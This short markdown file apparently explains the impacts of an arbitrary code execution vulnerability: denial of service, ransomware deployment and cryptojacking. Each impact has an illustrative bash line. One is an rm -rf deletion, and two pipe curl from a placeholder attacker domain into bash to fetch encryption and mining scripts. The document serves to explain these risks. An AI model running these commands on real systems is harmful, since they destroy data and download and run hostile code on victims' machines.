# Arbitrary Code Execution

## Description
Due to its nature, code execution inherently encompasses most of the impacts and risks associated with vulnerabilities addressed in other files.

## Table of Contents
- [Ransomware Deployment](#ransomware-deployment)
- [Cryptojacking](#cryptojacking)

## Denial of Service
### It could lead to the service interruption.
- Deleting critical files
    ```bash
        rm -rf /app/data/uploads/sensitive_file.txt
    ```

## Ransomware Deployment
### It could lead to data being held for ransom.
- Malicious script (or file) execution.
    ```bash
    curl -s https://[ATTACKER-DOMAIN]/encrypt.sh | bash
    ```

## Cryptojacking
### The victim's resources may be used for cryptocurrency mining, which requires significant resources.
- Cryptocurrency mining
    ```bash
    curl -s https://[ATTACKER-DOMAIN]/mining.sh | bash
    ```